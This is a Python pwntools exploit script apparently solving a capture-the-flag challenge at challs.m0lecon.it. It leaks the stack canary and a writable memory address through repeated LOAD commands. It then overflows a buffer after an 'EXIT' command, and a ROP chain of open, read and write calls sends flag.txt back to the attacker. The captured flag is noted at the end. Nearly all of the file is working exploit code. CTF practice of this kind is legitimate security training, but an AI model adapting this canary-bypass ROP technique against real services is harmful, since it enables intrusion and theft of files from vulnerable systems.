#!/usr/bin/env python3
from pwn import *
#context(os="linux", arch="amd64",log_level = "debug")

p = remote('challs.m0lecon.it', 9010)

if args['REMOTE']:
    p = remote('challs.m0lecon.it', 9010)
    canary_load = '3'
    rw_load = '6'
else:
    # Port number for the challenge is stored in config.txt
    portno = int(open('config.txt', 'r').read().strip())
    p = remote('localhost', portno)
    canary_load = '1'
    rw_load = '4'

# Leaking the canary
p.sendline("LOAD {}".format(canary_load)) # for remote
canary_leak = u64(p.recv(8))
log.info("Canary: " + hex(canary_leak))

# Leaking the rw memory area
p.sendline("LOAD {}".format(rw_load)) # for remote
rw_leak = u64(p.recv(8))
log.info("RW: " + hex(rw_leak))

# Address of gadgets and gizmos
flagtxt = 0x0401518
pop_rdi = 0x04014f3
pop_rsi_r15 = 0x04014f1
open_fn = 0x0400c40
read_fn = 0x0400be0
write_fn = 0x0400b60
mov_rdx = 0x0401528

# 40 bytes to canary - 4 bytes in 'EXIT' = 36 bytes of filler
payload = b'A'*36
payload += p64(canary_leak)
# 8 bytes of junk to get to rbp
payload += b'B'*8

# ROP Chain
# open(ptr to flag.txt, flags(set to 0))
payload += p64(pop_rdi)
payload += p64(flagtxt)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(open_fn)

# read(3(fd), rw-area, count of 0x20)
payload += p64(mov_rdx)
payload += p64(pop_rsi_r15)
payload += p64(rw_leak)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(read_fn)

# write(4(fd), rw-area, count of 0x20)
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(rw_leak)
payload += p64(0)
payload += p64(mov_rdx)
payload += p64(write_fn)

p.sendline(b"EXIT"+payload)
# p.interactive()
log.info("Flag: {}".format(p.recvall().decode()))

# Flag: ptm{f0rk5_ar3n7_g00d_f0r_cnr13s}


